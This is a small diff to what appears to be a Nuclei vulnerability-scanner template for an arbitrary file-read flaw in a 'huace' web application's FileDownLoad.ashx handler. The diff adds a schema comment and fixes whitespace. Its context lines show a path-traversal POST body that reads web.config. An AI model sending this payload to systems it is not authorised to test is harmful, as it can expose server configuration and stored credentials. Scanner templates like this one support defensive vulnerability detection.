@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: huace-FileDownLoad-fileRead
 
 info:
@@ -9,7 +10,7 @@ http:
   - method: POST
     path:
       - "{{BaseURL}}/Handler/FileDownLoad.ashx"
-    
+
     body: "filename=1&filepath=..%2F..%2Fweb.config"
 
     matchers-condition: and
